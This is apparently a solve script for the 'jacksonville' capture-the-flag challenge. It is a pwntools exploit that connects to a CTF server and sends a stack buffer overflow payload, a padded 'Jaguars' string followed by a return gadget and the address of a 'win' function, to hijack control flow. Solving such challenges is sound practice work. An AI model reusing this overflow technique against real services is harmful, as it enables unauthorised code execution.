#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './jacksonville')
libc = ELF(exe.libc.path)


io = remote("chal.sunshinectf.games", 25602)
io.sendlineafter(b"> ", (b"A"*6 + b"Jaguars" + b"\x00").ljust(0x68, b"A") + p64(0x40101a) + p64(exe.symbols['win']))
io.interactive()
